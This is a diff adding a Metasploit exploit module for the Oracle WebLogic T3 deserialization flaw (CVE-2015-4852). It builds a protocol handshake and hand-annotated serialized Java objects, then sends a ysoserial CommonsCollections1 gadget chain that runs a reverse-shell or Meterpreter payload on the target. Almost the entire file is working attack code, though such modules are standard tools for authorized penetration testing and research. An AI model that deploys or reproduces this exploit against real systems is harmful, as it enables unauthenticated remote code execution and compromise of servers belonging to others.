@@ -1,0 +1,524 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core/exploit/powershell'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+  #include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Powershell
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name' => 'Oracle Weblogic Server Deserialization RCE - Raw Object',
+      'Description' => %q{
+        An unauthenticated attacker with network access to the Oracle Weblogic Server T3
+        interface can send a serialized object (weblogic.jms.common.StreamMessageImpl)
+        to the interface to execute code on vulnerable hosts.
+      },
+      'Author' =>
+        [
+        'Andres Rodriguez',  # Metasploit Module - 2Secure (@acamro, acamro[at]gmail.com)
+        'Stephen Breen',     # Vulnerability Discovery
+        'Aaron Soto'         # Reverse Engineering JSO and ysoserial blobs
+        ],
+      'License' => MSF_LICENSE,
+      'References' =>
+        [
+          ['CVE', '2015-4852']
+        ],
+      'Privileged' => false,
+      'Platform' => %w{ unix win solaris },
+      'Targets' =>
+        [
+          [ 'Unix',
+            'Platform' => 'unix',
+            'Arch' => ARCH_CMD,
+            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_python'},
+            'Payload' => {
+              'Encoder' => 'cmd/ifs',
+              'BadChars' => ' ',
+              'Compat' => {'PayloadType' => 'cmd', 'RequiredCmd' => 'python'}
+            }
+          ],
+          [ 'Windows',
+            'Platform' => 'win',
+            'Payload' => {},
+            'DefaultOptions' => {'PAYLOAD' => 'windows/meterpreter/reverse_tcp'}
+          ],
+          [ 'Solaris',
+            'Platform' => 'solaris',
+            'Arch' => ARCH_CMD,
+            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_perl'},
+            'Payload' => {
+              'Space'       => 2048,
+              'DisableNops' => true,
+              'Compat'      =>
+                {
+                  'PayloadType' => 'cmd',
+                  'RequiredCmd' => 'generic perl telnet',
+                }
+            }
+          ]
+        ],
+      'DefaultTarget' => 0,
+      'DisclosureDate' => 'Jan 28 2015'))
+
+    register_options([Opt::RPORT(7001)])
+  end
+
+=begin   This check is currently incompatible with the Tcp mixin.  :-(
+  def check
+    resp = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => '/console/login/LoginForm.jsp'
+    )
+
+    return CheckCode::Unknown unless resp && resp.code == 200
+
+    unless resp.body.include?('Oracle WebLogic Server Administration Console')
+      vprint_warning("Oracle WebLogic Server banner cannot be found")
+      return CheckCode::Unknown
+    end
+
+    /WebLogic Server Version: (?<version>\d+\.\d+\.\d+\.\d*)/ =~ resp.body
+    unless version
+      vprint_warning("Oracle WebLogic Server version cannot be found")
+      return CheckCode::Unknown
+    end
+
+    version = Gem::Version.new(version)
+    vprint_good("Detected Oracle WebLogic Server Version: #{version}")
+    case
+    when version.to_s.start_with?('10.3')
+      return CheckCode::Appears unless version > Gem::Version.new('10.3.6.0')
+    when version.to_s.start_with?('12.1.2')
+      return CheckCode::Appears unless version > Gem::Version.new('12.1.2.0')
+    when version.to_s.start_with?('12.1.3')
+      return CheckCode::Appears unless version > Gem::Version.new('12.1.3.0')
+    when version.to_s.start_with?('12.2')
+      return CheckCode::Appears unless version > Gem::Version.new('12.2.1.0')
+    end
+
+    return CheckCode::Safe
+  end
+=end
+
+  def t3_handshake
+    # retrieved from network traffic
+    shake = "t3 12.2.1\n"
+    shake << "AS:255\n"
+    shake << "HL:19\n"
+    shake << "MS:10000000\n\n"
+
+    sock.put(shake)
+    sleep(1)
+    sock.get_once
+  end
+
+  def build_t3_request_object
+    # T3 request serialized data
+    # retrieved by watching network traffic
+    # This is a proprietary, undocumented protocol
+
+    # TODO: Cite a source for the dissection of in the following 14 lines:
+    data =  '000005c3'                                     # lenght of the packet
+    data << '01'                                           # CMD_IDENTIFY_REQUEST
+    data << '65'                                           # QOS
+    data << '01'                                           # Flags:
+                                                           #   CONTEXT_JVMID_FLAG = 1 (has JVMIDs)
+                                                           #   CONTEXT_TX_FLAG = 2
+                                                           #   CONTEXT_TRACE_FLAG = 4
+                                                           #   CONTEXT_EXTENDED_FLAG = 8
+                                                           #   CONTEXT_EXTENDED_USER_FLAG = 16
+    data << 'ffffffff'                                     # response id
+    data << 'ffffffff'                                     # invocable id
+    data << '0000006a'                                     # abbrev offset
+    data << '0000ea60'                                     # reconnect timeout ??
+
+    data << '0000001900937b484a'
+    data << '56fa4a777666f581daa4f5b90e2aebfc607499'
+    data << 'b4027973720078720178720278700000000a00'
+    data << '00000300000000000000060070707070707000'
+    data << '00000a000000030000000000000006007006'
+
+    data << 'fe010000'                                     # ----- separator -----
+
+    data << 'aced0005'                                     # JSO v5 header
+    data << '73'                                           # object header
+    data << '72001d'                                       # className (29 bytes):
+    data << '7765626c6f6769632e726a766d2e436c617373'       #   weblogic.rjvm.ClassTableEntry
+    data << '5461626c65456e747279'                         #     (continued)
+    data << '2f52658157f4f9ed'                             #   serialVersionUID
+    data << '0c00007870'                                   #   remainder of object header
+    data << '72'                                           # object header
+    data << '00247765626c6f6769632e636f6d6d6f6e2e696e74'   #   className (36 bytes): weblogic.common.internal.PackageInfo
+    data << '65726e616c2e5061636b616765496e666f'           #     (continued)
+    data << 'e6f723e7b8ae1ec9'                             #   serialVersionUID
+    data << '02'                                           #   SC_SERIALIZABLE
+    data << '0008'                                         #   fieldCount = 8
+    data << '4900056d616a6f72'                             #     0: Int: major
+    data << '4900056d696e6f72'                             #     1: Int: minor
+    data << '49000c726f6c6c696e675061746368'               #     2: Int rollingPatch
+    data << '49000b736572766963655061636b'                 #     3: Int: servicePack
+    data << '5a000e74656d706f726172795061746368'           #     4: Bool: temporaryPatch
+    data << '4c0009696d706c5469746c65'                     #     5: Obj: implTitle
+    data << '7400124c6a6176612f6c616e672f537472696e673b'   #        java/lang/String
+    data << '4c000a696d706c56656e646f72'                   #     6: Obj: implVendor
+    data << '71007e0003'                                   #        (Handle) 0x007e0003
+    data << '4c000b696d706c56657273696f6e'                 #     7: Obj: implVersion
+    data << '71007e0003'                                   #        (Handle) 0x007e0003
+    data << '78707702000078'                               #   block footers
+
+    data << 'fe010000'                                     # ----- separator -----
+
+    data << 'aced0005'                                     # JSO v5 header
+    data << '7372'                                         #   object header
+    data << '001d7765626c6f6769632e726a766d2e436c6173'     #   className (29 bytes): weblogic.rjvm.ClassTableEntry
+    data << '735461626c65456e747279'                       #     (continued)
+    data << '2f52658157f4f9ed'                             #   serialVersionUID
+    data << '0c'                                           #   EXTERNALIZABLE | BLOCKDATA
+    data << '00007870'                                     #   remainder of object header
+    data << '72'                                           # object header
+    data << '00247765626c6f6769632e636f6d6d6f6e2e696'      #   className (36 bytes): weblogic.common.internal.VersionInfo
+    data << 'e7465726e616c2e56657273696f6e496e666f'        #     (continued)
+    data << '972245516452463e'                             #   serialVersionUID
+    data << '02'                                           #   SC_SERIALIZABLE
+    data << '0003'                                         #   fieldCount = 3
+    data << '5b0008'                                       #   array header (8 bytes)
+    data << '7061636b61676573'                             #     ARRAY NAME = 'packages'
+    data << '740027'                                       #     TC_STRING className1 (39 bytes)
+    data << '5b4c7765626c6f6769632f636f6d6d6f6e2f69'       #       weblogic/common/internal/PackageInfo
+    data << '6e7465726e616c2f5061636b616765496e666f'       #       (continued)
+    data << '3b'                                           #       (continued)
+    data << '4c000e'                                       #   object header (14 bytes)
+    data << '72656c6561736556657273696f6e'                 #     releaseVersion
+    data << '740012'                                       #     TC_STRING (18 bytes)
+    data << '4c6a6176612f6c616e672f537472696e673b'         #       versionInfoAsBytes
+    data << '5b0012'                                       #   array header (18 bytes)
+    data << '76657273696f6e496e666f41734279746573'         #     ARRAY NAME = java/lang/String;
+    data << '740002'                                       #     TC_STRING (2 bytes)
+    data << '5b42'                                         #       0x5b42 = [B
+    data << '78'                                           # block footer
+
+    data << '720024'                                       # class (36 bytes)
+    data << '7765626c6f6769632e636f6d6d6f6e2e696e'         #   weblogic.common.internal.PackageInfo
+    data << '7465726e616c2e5061636b616765496e666f'         #     (continued)
+    data << 'e6f723e7b8ae1ec9'                             #   serialVersionUID
+
+    data << '02'                                           #   SC_SERIALIZABLE
+    data << '0008'                                         #   fieldCount = 8
+    data << '4900056d616a6f72'                             #   0: Int: major
+    data << '4900056d696e6f72'                             #   1: Int: minor
+    data << '49000c726f6c6c696e675061746368'               #   2: Int rollingPatch
+    data << '49000b736572766963655061636b'                 #   3: Int: servicePack
+    data << '5a000e74656d706f726172795061746368'           #   4: Bool: temporaryPatch
+    data << '4c0009696d706c5469746c65'                     #   5: Obj: implTitle
+    data << '71'                                           #      TC_REFERENCE
+    data << '007e0004'                                     #      Handle = 0x007e0004
+    data << '4c000a696d706c56656e646f72'                   #   6: Obj: implVendor
+    data << '71'                                           #      TC_REFERENCE
+    data << '007e0004'                                     #      Handle = 0x007e0004
+    data << '4c000b696d706c56657273696f6e'                 #   7: Obj: implVersion
+    data << '71'                                           #      TC_REFERENCE
+    data << '007e0004'                                     #      Handle = 0x007e0004
+    data << '78'                                           # class footer
+    data << '70'                                           # TC_NULL
+    data << '77020000'                                     # BLOCKDATA (2 bytes): 0x0000
+    data << '78'                                           # block footer
+
+    data << 'fe010000'                                     # ----- separator -----
+
+    data << 'aced0005'                                     # JSO v5 header
+    data << '73'                                           # object header
+    data << '72001d'                                       # className (29 bytes):
+    data << '7765626c6f6769632e726a766d2e436c617373'       #   weblogic.rjvm.ClassTableEntry
+    data << '5461626c65456e747279'                         #     (continued)
+    data << '2f52658157f4f9ed'                             #   serialVersionUID
+    data << '0c00007870'                                   #   remainder of object header
+    data << '720021'                                       # className (33 bytes)
+    data << '7765626c6f6769632e636f6d6d6f6e2e696e74'       #   weblogic.common.internal.PeerInfo
+    data << '65726e616c2e50656572496e666f'                 #     (continued)
+    data << '585474f39bc908f1'                             #   serialVersionUID
+    data << '02'                                           #   SC_SERIALIZABLE
+    data << '0006'                                         #   fieldCount = 6
+    data << '4900056d616a6f72'                             #     0: Int: major
+    data << '4900056d696e6f72'                             #     1: Int: minor
+    data << '49000c726f6c6c696e675061746368'               #     2: Int rollingPatch
+    data << '49000b736572766963655061636b'                 #     3: Int: servicePack
+    data << '5a000e74656d706f726172795061746368'           #     4: Bool: temporaryPatch
+    data << '5b00087061636b61676573'                       #     5: Array: packages
+    data << '740027'                                       #        TC_STRING (39 bytes)
+    data << '5b4c7765626c6f6769632f636f6d6d6f6e2f69'       #        Lweblogic/common/internal/PackageInfo;
+    data << '6e7465726e616c2f5061636b616765496e666f'       #        (continued)
+    data << '3b'                                           #        (continued)
+    data << '78'                                           # block footer
+    data << '720024'                                       # class header
+    data << '7765626c6f6769632e636f6d6d6f6e2e696e74'       #   Name = Lweblogic/common/internal/PackageInfo;
+    data << '65726e616c2e56657273696f6e496e666f'           #     (continued)
+    data << '972245516452463e'                             #   serialVersionUID
+    data << '02'                                           #   SC_SERIALIZABLE
+    data << '0003'                                         #   fieldCount = 3
+    data << '5b0008'                                       #   0: Array
+    data << '7061636b6167657371'                           #      packages
+    data << '007e0003'                                     #      Handle = 0x00730003
+    data << '4c000e72656c6561736556657273696f6e'           #   1: Obj: releaseVersion
+    data << '7400124c6a6176612f6c616e672f537472696e673b'   #      Ljava/lang/String;
+    data << '5b001276657273696f6e496e666f41734279746573'   #   2: Array: versionInfoAsBytes
+    data << '740002'                                       #      TC_STRING (2 bytes)
+    data << '5b42'                                         #      VALUE = 0x5b42 = [B
+    data << '78'                                           # block footer
+    data << '720024'                                       # class header
+    data << '7765626c6f6769632e636f6d6d6f6e2e696e746572'   #   Name = weblogic.common.internal.PackageInfo
+    data << '6e616c2e5061636b616765496e666f'               #     (continued)
+    data << 'e6f723e7b8ae1ec9'                             #   serialVersionUID
+    data << '02'                                           #   SC_SERIALIZABLE
+    data << '0008'                                         #   fieldCount = 8
+    data << '4900056d616a6f72'                             #   0: Int: major
+    data << '4900056d696e6f72'                             #   1: Int: minor
+    data << '49000c726f6c6c696e675061746368'               #   2: Int rollingPatch
+    data << '49000b736572766963655061636b'                 #   3: Int: servicePack
+    data << '5a000e74656d706f726172795061746368'           #   4: Bool: temporaryPatch
+    data << '4c0009696d706c5469746c65'                     #   5: Obj: implTitle
+    data << '71'                                           #      TC_REFERENCE
+    data << '007e0005'                                     #      Handle = 0x007e0005
+    data << '4c000a696d706c56656e646f72'                   #   6: Obj: implVendor
+    data << '71'                                           #      TC_REFERENCE
+    data << '007e0005'                                     #      Handle = 0x007e0005
+    data << '4c000b696d706c56657273696f6e'                 #   7: Obj: implVersion
+    data << '71'                                           #      TC_REFERENCE
+    data << '007e0005'                                     #      Handle = 0x007e0005
+    data << '78'                                           # class footer
+    data << '707702000078'                                 # block footers
+
+    data << 'fe00ff'                                       # this cruft again.  some kind of footer
+
+    data << 'fe010000'                                     # ----- separator -----
+
+    # weblogic.rjvm.JVMID object
+    data << 'aced0005'                                     # JSO v5 header
+    data << '73'                                           # object header
+    data << '720013'                                       #   class header
+    data << '7765626c6f6769632e726a766d2e4a564d4944'       #     name = 'weblogic.rjvm.JVMID'
+    data << 'dc49c23ede121e2a'                             #     serialVersionUID
+    data << '0c'                                           #     EXTERNALIZABLE | BLOCKDATA
+    data << '0000'                                         #     fieldCount = 0   (!!!)
+    data << '78'                                           #   block footer
+    data << '70'                                           # NULL
+    data << '7750'                                         # block header (80 bytes)
+    data << '21'                                           #   !
+    data << '000000000000000000'                           #   9 NULL BYTES
+
+    data << '0d'                                           #   strLength = 13 bytes
+    #data << '3139322e3136382e312e323237'                  #   original PoC string = 192.168.1.227
+    data << '3030302e3030302e3030302e30'                   #   new string = 000.000.000.0
+                                                           #      (must be an IP, and length isn't trivially editable)
+    data << '00'                                           #   \0
+
+    data << '12'                                           #   strLength = 18 bytes
+    #data << '57494e2d4147444d565155423154362e6568'        #   original str = WIN-AGDMVQUB1T6.eh
+    data << rand_text_alphanumeric(18).unpack('H*')[0]
+
+    data << '83348cd6'                                     #  original = ??? UNKNOWN ???  (Note: Cannot be randomized)
+
+    data << '000000070000'                                 #   ??? UNKNOWN ???
+    data << rport.to_s(16).rjust(4, '0')                   #   callback port
+    data << 'ffffffffffffffffffffffffffffffffffffff'       #   ??? UNKNOWN ???
+    data << 'ffffffffff'                                   #   ??? UNKNOWN ???
+    data << '78'                                           # block footer
+
+    data << 'fe010000'                                     # ----- separator -----
+
+    # weblogic.rjvm.JVMID object
+    data << 'aced0005'                                     # JSO v5 header
+    data << '73'                                           # object header
+    data << '72'                                           #   class
+    data << '00137765626c6f6769632e726a766d2e4a564d4944'   #   Name: weblogic.rjvm.JVMID
+    data << 'dc49c23ede121e2a'                             #   serialVersionUID
+    data << '0c'                                           #   EXTERNALIZABLE | BLOCKDATA
+    data << '0000'                                         #   fieldCount = 0
+    data << '78'                                           # end block
+    data << '70'                                           # TC_NULL
+    data << '77'                                           # block header
+    data << '20'                                           #   length = 32 bytes
+    data << '0114dc42bd071a772700'                         #   old string = ??? UNKNOWN ???
+    #data << rand_text_alphanumeric(10).unpack('H*')[0]    #     (NOTE: RANDOMIZAITON BREAKS THINGS)
+
+    data << '0d'                                           #   string length = 13 bytes (NOTE: do not edit)
+    #data << '3234322e3231342e312e323534'                  #   original string = 242.214.1.254
+    data << '3030302e3030302e3030302e30'                   #   new string = 000.000.000.0
+                                                           #      (must be an IP, and length isn't trivially editable)
+
+    #data << '61863d1d'                                    #   original string = ??? UNKNOWN ???
+    data << rand_text_alphanumeric(4).unpack('H*')[0]      #   new = randomized
+
+    data << '00000000'                                     #   NULL BYTES
+    data << '78'                                           # block footer
+
+    sock.put([data].pack('H*'))
+    sleep(1)
+    sock.get_once
+  end
+
+  def send_payload_objdata
+    # payload creation
+    if target.name == 'Windows'
+      mycmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true})
+    elsif target.name == 'Unix' || target.name == 'Solaris'
+      mycmd = payload.encoded
+    end
+
+    # basic weblogic ClassTableEntry object (serialized)
+    # TODO: WHAT DOES THIS DO?  CAN WE RANDOMIZE ANY OF IT?
+    payload = '056508000000010000001b0000005d0101007372017870737202787000000000'
+    payload << '00000000757203787000000000787400087765626c6f67696375720478700000'
+    payload << '000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306'
+
+    payload << 'fe010000'                                  # ----- separator -----
+
+    payload << 'aced0005'                                  # JSO v5 header
+    payload << '73'                                        # object header
+    payload << '72'                                        #   class
+    payload << '001d7765626c6f6769632e726a766d2e436c61'    #   Name: weblogic.rjvm.ClassTableEntry
+    payload << '73735461626c65456e747279'                  #     (cont)
+    payload << '2f52658157f4f9ed'                          #   serialVersionUID
+    payload << '0c'                                        #   EXTERNALIZABLE | BLOCKDATA
+    payload << '0000'                                      #   fieldCount = 0
+    payload << '7870'                                      #   remaining object header
+    payload << '72'                                        # class header
+    payload << '00025b42'                                  #   Name: 0x5b42
+    payload << 'acf317f8060854e0'                          #   serialVersionUID
+    payload << '02'                                        #   SERIALIZABLE
+    payload << '0000'                                      #   fieldCount = 0
+    payload << '7870'                                      #   class footer
+    payload << '77'                                        # block header
+    payload << '020000'                                    #   contents = 0x0000
+    payload << '78'                                        #   block footer
+
+    payload << 'fe010000'                                  # ----- separator -----
+
+    payload << 'aced0005'                                  # JSO v5 header
+    payload << '73'                                        # object header
+    payload << '72'                                        #   class
+    payload << '001d7765626c6f6769632e726a766d2e436c61'    #   Name: weblogic.rjvm.ClassTableEntry
+    payload << '73735461626c65456e747279'                  #     (cont)
+    payload << '2f52658157f4f9ed'                          #   serialVersionUID
+    payload << '0c'                                        #   EXTERNALIZABLE | BLOCKDATA
+    payload << '0000'                                      #   fieldCount = 0
+    payload << '7870'                                      #   remaining object header
+    payload << '72'                                        # class header
+
+    payload << '00135b4c6a6176612e6c616e672e4f626a'        #   Name: [Ljava.lang.Object;
+    payload << '6563743b'                                  #     (cont)
+    payload << '90ce589f1073296c'                          #   serialVersionUID
+    payload << '02'                                        #   SERIALIZABLE
+    payload << '0000'                                      #   fieldCount = 0
+    payload << '7870'                                      #   remaining object header
+    payload << '77'                                        # block header
+    payload << '020000'                                    #   contents = 0x0000
+    payload << '78'                                        #   block footer
+
+    payload << 'fe010000'                                  # ----- separator -----
+
+    payload << 'aced0005'                                  # JSO v5 header
+    payload << '73'                                        # object header
+    payload << '72'                                        #   class
+
+    payload << '001d7765626c6f6769632e726a766d2e436c61'    #   Name: weblogic.rjvm.ClassTableEntry
+    payload << '73735461626c65456e747279'                  #     (cont)
+    payload << '2f52658157f4f9ed'                          #   serialVersionUID
+    payload << '0c'                                        #   SERIALIZABLE | BLOCKDATA
+    payload << '0000'                                      #   fieldCount = 0
+    payload << '7870'                                      #   block footer
+    payload << '72'                                        # class header
+    payload << '00106a6176612e7574696c2e566563746f72'      #   Name: java.util.Vector
+    payload << 'd9977d5b803baf01'                          #   serialVersionUID
+    payload << '03'                                        #   WRITE_METHOD | SERIALIZABLE
+    payload << '0003'                                      #   fieldCount = 3
+    payload << '4900116361706163697479496e6372656d656e74'  #   0: Int: capacityIncrement
+    payload << '49000c656c656d656e74436f756e74'            #   1: Int: elementCount
+    payload << '5b000b656c656d656e7444617461'              #   2: Array: elementData
+    payload << '7400135b4c6a6176612f6c616e672f4f626a6563'  #   3: String: [Ljava/lang/Object;
+    payload << '743b'                                      #      (cont)
+    payload << '7870'                                      #   remaining object header
+    payload << '77'                                        # block header
+    payload << '020000'                                    #   contents = 0x0000
+    payload << '78'                                        #   block footer
+
+    payload << 'fe010000'                                  # ----- separator -----
+
+    ysoserial_payload = ::Msf::Util::JavaDeserialization.ysoserial_payload("CommonsCollections1",mycmd)
+    payload << ysoserial_payload.each_byte.map { |b| b.to_s(16).rjust(2,'0') }.join
+
+    payload << 'fe010000'                                  # ----- separator -----
+
+    # basic weblogic ImmutableServiceContext object (serialized)
+    payload << 'aced0005'                                  # JSO v5 header
+    payload << '73'                                        # object header
+    payload << '72'                                        #   class
+    payload << '00257765626c6f6769632e726a766d2e496d6d75'  #   Name: weblogic.rjvm.ImmutableServiceContext
+    payload << '7461626c6553657276696365436f6e74657874'    #     (cont)
+    payload << 'ddcba8706386f0ba'                          #   serialVersionUID
+    payload << '0c'                                        #   EXTERNALIZABLE | BLOCKDATA
+    payload << '0000'                                      #   fieldCount = 0
+    payload << '78'                                        #   object footer
+    payload << '72'                                        # block header
+    payload << '00297765626c6f6769632e726d692e70726f76'    #   Name: weblogic.rmi.provider.BasicServiceContext
+    payload << '696465722e426173696353657276696365436f'    #     (cont)
+    payload << '6e74657874'                                #     (cont)
+    payload << 'e4632236c5d4a71e'                          #   serialVersionUID
+    payload << '0c'                                        #     EXTERNALIZABLE | BLOCKDATA
+    payload << '0000'                                      #   fieldCount = 0
+    payload << '7870'                                      #   block footer
+    payload << '77'                                        # block header
+    payload << '020600'                                    #   contents = 0x0600
+    payload << '7372'                                      #   class descriptor
+    payload << '00267765626c6f6769632e726d692e696e7465'    #     Name: weblogic.rmi.internal.MethodDescriptor
+    payload << '726e616c2e4d6574686f644465736372697074'    #       (cont)
+    payload << '6f72'                                      #       (cont)
+    payload << '12485a828af7f67b'                          #     serialVersionUID
+    payload << '0c'                                        #     EXTERNALIZABLE | BLOCKDATA
+    payload << '0000'                                      #     fieldCount = 0
+    payload << '7870'                                      #     class footer
+    payload << '77'                                        #   class data
+
+    #payload << '34002e61757468656e746963617465284c7765'    #     old contents = 0x002e61757468656e746963617465284c7765
+    #payload << '626c6f6769632e73656375726974792e61636c'    #                    626c6f6769632e73656375726974792e61636c
+    #payload << '2e55736572496e666f3b290000001b'            #                    2e55736572496e666f3b290000001b
+    payload << rand_text_alphanumeric(52).unpack('H*')[0]  #   new = randomized
+    payload << '78'                                        #     class footer
+    payload << '78'                                        #   block footer
+                                                           # MISSING OBJECT FOOTER (0x78)
+
+    payload << 'fe00ff'                                    # this cruft again.  some kind of footer
+
+    # sets the length of the stream
+    data = ((payload.length >> 1) + 4).to_s(16).rjust(8,'0')
+    data << payload
+
+    sock.put([data].pack('H*'))
+    sleep(1)
+    sock.get_once
+
+  end
+
+  def exploit
+    connect
+
+    print_status('Sending handshake...')
+    t3_handshake
+
+    print_status('Sending T3 request object...')
+    build_t3_request_object
+
+    print_status('Sending client object payload...')
+    send_payload_objdata
+
+    handler
+    disconnect
+  end
+end
